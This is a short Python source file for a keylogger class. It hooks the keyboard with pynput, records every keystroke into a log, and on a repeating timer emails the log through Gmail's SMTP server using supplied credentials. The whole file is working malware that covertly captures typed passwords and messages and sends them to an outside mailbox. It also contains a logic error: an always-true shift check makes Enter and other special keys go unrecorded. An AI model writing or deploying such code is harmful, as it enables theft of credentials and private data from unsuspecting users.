import pynput.keyboard as inputs , smtplib
import threading


class Keylogger:
    def __init__(self,email,password,time_interval):
        self.time = time_interval
        self.email = email
        self.password = password
        self.log = "Keylogger\n======================"
        self.caps_count = 0




    def send_mail(self, email, password, message):
        print(message)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()



    def append_to_log(self,string,caps):
        if caps:
            if string.islower():
                self.log += str(string).upper()
            else:
                self.log += str(string).lower()
        else:
            self.log += str(string)

    def key_press(self,key):
        try:
            if self.caps_count % 2 != 0:
                self.append_to_log(str(key.char), True)
            else:
                self.append_to_log(str(key.char),False)
        except AttributeError:
            if key == inputs.Key.space:
                self.append_to_log(" ",False)
            elif key == inputs.Key.backspace:
                self.log = self.log[:-1]
            elif key == inputs.Key.caps_lock:
                self.caps_count += 1
            elif key == inputs.Key.shift or inputs.Key.shift_r:
                pass
            elif key == inputs.Key.enter:
                self.append_to_log("\n",True)
            else:
                self.append_to_log((" " + str(key) + " "), True)


    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.time, self.report)
        timer.start()

    def start(self):
        keyboard_listener = inputs.Listener(on_press=self.key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


